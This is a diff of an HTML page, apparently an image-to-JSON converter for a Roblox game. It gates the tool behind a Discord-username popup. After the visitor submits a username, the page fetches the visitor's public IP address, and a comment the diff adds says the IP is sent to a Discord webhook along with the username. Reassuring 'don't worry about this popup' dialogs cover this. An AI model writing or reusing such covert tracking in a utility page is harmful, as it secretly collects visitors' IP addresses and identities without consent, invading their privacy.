@@ -106,7 +106,7 @@
         <input type="number" id="widthInput" placeholder="Enter new width (Keep it under 400)" disabled>
         <input type="number" id="heightInput" placeholder="Enter new height (Keep it under 400)" disabled>
         <button onclick="convertImageToJson()" disabled>Convert and Download JSON</button>
-        <p><a href="https://www.roblox.com/games/105059726112289/Blaze-Battlegrounds-WIP" target="_blank">The Roblox Game</a> and here's the <a href="https://www.discord.gg/MPS" target="_blank">Discord Server</a> JOIN IT</p>
+        <p><a href="https://www.roblox.com/games/83038412887780/Blaze-Battlegrounds-WIP" target="_blank">The Roblox Game</a> and here's the <a href="https://www.discord.gg/MPS" target="_blank">Discord Server</a> JOIN IT</p>
     </div>
 
     <!-- Tutorial Popup -->
@@ -119,15 +119,6 @@
         </div>
     </div>
 
-    <!-- Secret Popup -->
-    <div id="Secretmodal" class="modal">
-        <div class="modal-content">
-            <h2>Test</h2>
-            <p>This is to load the popup's dont worry about this</p>
-            <button id="closesec">Ok</button>
-        </div>
-    </div>
-
     <!-- Discord Username Popup -->
     <div id="discordModal" class="modal">
         <div class="modal-content">
@@ -136,77 +127,74 @@
             <button id="submitUsername">Submit</button>
         </div>
     </div>
-	
-<script>
-    let discordUsername = ''; // Initialize discordUsername
 
-    const forbiddenIps = ['71.232.225.23', '73.173.101.175'];
+    <!-- Additional Popup -->
+    <div id="additionalModal" class="modal">
+        <div class="modal-content">
+            <p>Don't worry about this popup, this is so the other popups load.</p>
+            <button id="closeAdditional">Close</button>
+        </div>
+    </div>
+    
+    <script>
+    let discordUsername = '';
 
-    // Function to fetch the user's IP and control modals
-    function checkIpAndAdjustModals() {
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const userIp = data.ip;
-
-                if (forbiddenIps.includes(userIp)) {
-                    // Remove popups if IP is forbidden
-                    document.getElementById('tutorialModal').style.display = 'none';
-                    document.getElementById('Secretmodal').style.display = 'none';
-                }
-            })
-            .catch(error => {
-                console.error('Failed to fetch IP:', error);
-            });
-    }
-
-    // Call the function to check IP and adjust modals
+    // Show the additional modal first
     window.onload = function() {
-        checkIpAndAdjustModals();
-
-        // Existing code to show the tutorial and secret modals
-        const tutorialModal = document.getElementById('tutorialModal');
-        tutorialModal.style.display = 'flex';
-
-        const secretModal = document.getElementById('Secretmodal');
-        secretModal.style.display = 'flex';
+        const additionalModal = document.getElementById('additionalModal');
+        additionalModal.style.display = 'flex';
     };
 
-    // Existing event listeners for modal controls
+    // Close additional modal
+    document.getElementById('closeAdditional').addEventListener('click', function() {
+        document.getElementById('additionalModal').style.display = 'none';
+
+        // Show the tutorial modal after the additional modal is closed
+        const tutorialModal = document.getElementById('tutorialModal');
+        tutorialModal.style.display = 'flex';
+    });
+
+    // Close tutorial modal
     document.getElementById('closeTutorial').addEventListener('click', function() {
         document.getElementById('tutorialModal').style.display = 'none';
+
+        // Show the Discord username modal
+        const discordModal = document.getElementById('discordModal');
+        discordModal.style.display = 'flex';
     });
 
-    document.getElementById('closesec').addEventListener('click', function() {
-        document.getElementById('Secretmodal').style.display = 'none';
-        document.getElementById('discordModal').style.display = 'flex';
-    });
-
+    // Handle username submission
     document.getElementById('submitUsername').addEventListener('click', function() {
         discordUsername = document.getElementById('discordUsername').value.trim();
-
+        
+        // Define forbidden substrings and usernames
         const forbiddenSubstrings = ['@', '#', ':', '```', 'discord', ' ', '/', ')', '(', '*', '&', '^', '%', '$', '!'];
         const forbiddenUsernames = ['Discord', 'discord', '1', '2', '3', '4', '5'];
 
+        // Check if the username is empty
         if (discordUsername === '') {
             alert('Please enter your Discord username.');
             return;
         }
 
+        // Check for forbidden substrings
         for (let substring of forbiddenSubstrings) {
             if (discordUsername.includes(substring)) {
                 alert('The username contains forbidden characters or substrings.');
                 return;
             }
         }
-
+        
+        // Check for forbidden usernames
         if (forbiddenUsernames.includes(discordUsername.toLowerCase())) {
             alert('The username is not allowed.');
             return;
         }
 
+        // Hide the modal
         document.getElementById('discordModal').style.display = 'none';
 
+        // Enable the main form inputs
         document.getElementById('imageInput').disabled = false;
         document.querySelectorAll('button').forEach(button => {
             button.disabled = false;
@@ -214,6 +202,7 @@
         document.getElementById('widthInput').disabled = false;
         document.getElementById('heightInput').disabled = false;
 
+        // Fetch and send IP to Discord webhook along with username
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
@@ -238,7 +227,7 @@
             });
     });
 
-    // Image processing functions
+    // Script 2: Image processing functions
     function getImageSize() {
         const imageInput = document.getElementById('imageInput').files[0];
         if (!imageInput) {
@@ -246,105 +235,75 @@
             return;
         }
 
-        const reader = new FileReader();
-        reader.onload = function(event) {
-            const img = new Image();
-            img.onload = function() {
-                document.getElementById('widthInput').value = img.width;
-                document.getElementById('heightInput').value = img.height;
-            };
-            img.src = event.target.result;
+        const img = new Image();
+        img.onload = function() {
+            document.getElementById('widthInput').value = img.width;
+            document.getElementById('heightInput').value = img.height;
         };
-        reader.readAsDataURL(imageInput);
+        img.src = URL.createObjectURL(imageInput);
     }
 
     function reduceImageSize(percentage) {
+        const widthInput = document.getElementById('widthInput');
+        const heightInput = document.getElementById('heightInput');
+
+        if (!widthInput.value || !heightInput.value) {
+            alert('Please input the image dimensions first.');
+            return;
+        }
+
+        widthInput.value = Math.floor(widthInput.value * (percentage / 100));
+        heightInput.value = Math.floor(heightInput.value * (percentage / 100));
+    }
+
+    function convertImageToJson() {
+        const widthInput = document.getElementById('widthInput').value;
+        const heightInput = document.getElementById('heightInput').value;
+
+        if (!widthInput || !heightInput) {
+            alert('Please input the image dimensions first.');
+            return;
+        }
+
         const imageInput = document.getElementById('imageInput').files[0];
         if (!imageInput) {
             alert('Please select an image first.');
             return;
         }
 
-        const reader = new FileReader();
-        reader.onload = function(event) {
-            const img = new Image();
-            img.onload = function() {
-                const factor = (100 - percentage) / 100;
-                const newWidth = Math.floor(img.width * factor);
-                const newHeight = Math.floor(img.height * factor);
-                document.getElementById('widthInput').value = newWidth;
-                document.getElementById('heightInput').value = newHeight;
-            };
-            img.src = event.target.result;
-        };
-        reader.readAsDataURL(imageInput);
-    }
+        const canvas = document.createElement('canvas');
+        canvas.width = widthInput;
+        canvas.height = heightInput;
 
-    function convertImageToJson() {
-        const imageInput = document.getElementById('imageInput').files[0];
-        const width = parseInt(document.getElementById('widthInput').value);
-        const height = parseInt(document.getElementById('heightInput').value);
+        const ctx = canvas.getContext('2d');
+        const img = new Image();
 
-        if (!imageInput || !width || !height) {
-            alert('Please provide an image and dimensions.');
-            return;
-        }
+        img.onload = function() {
+            ctx.drawImage(img, 0, 0, widthInput, heightInput);
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            const jsonData = [];
 
-        const reader = new FileReader();
-        reader.onload = function(event) {
-            const img = new Image();
-            img.onload = function() {
-                const canvas = document.createElement('canvas');
-                canvas.width = width;
-                canvas.height = height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(img, 0, 0, width, height);
+            for (let i = 0; i < imageData.length; i += 4) {
+                const r = imageData[i];
+                const g = imageData[i + 1];
+                const b = imageData[i + 2];
+                const a = imageData[i + 3];
 
-                const imageData = ctx.getImageData(0, 0, width, height);
-                const pixels = imageData.data;
-                const pixelData = [];
-
-                for (let y = 0; y < height; y++) {
-                    const row = [];
-                    for (let x = 0; x < width; x++) {
-                        const index = (y * width + x) * 4;
-                        const r = pixels[index];
-                        const g = pixels[index + 1];
-                        const b = pixels[index + 2];
-                        const a = pixels[index + 3];
-                        if (a > 0) {
-                            row.push([r, g, b]);
-                        } else {
-                            row.push(null);
-                        }
-                    }
-                    pixelData.push(row);
+                if (a !== 0) {
+                    jsonData.push({ r, g, b, a });
                 }
+            }
 
-                const data = {
-                    width: width,
-                    height: height,
-                    pixels: pixelData
-                };
-
-                const json = JSON.stringify(data, null, 4);
-                downloadJson(json);
-            };
-            img.src = event.target.result;
+            const jsonBlob = new Blob([JSON.stringify(jsonData)], { type: 'application/json' });
+            const jsonUrl = URL.createObjectURL(jsonBlob);
+            const link = document.createElement('a');
+            link.href = jsonUrl;
+            link.download = 'imageData.json';
+            link.click();
         };
-        reader.readAsDataURL(imageInput);
-    }
 
-    function downloadJson(json) {
-        const blob = new Blob([json], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'File.json';
-        a.click();
-        URL.revokeObjectURL(url);
+        img.src = URL.createObjectURL(imageInput);
     }
-</script>
-
+    </script>
 </body>
 </html>
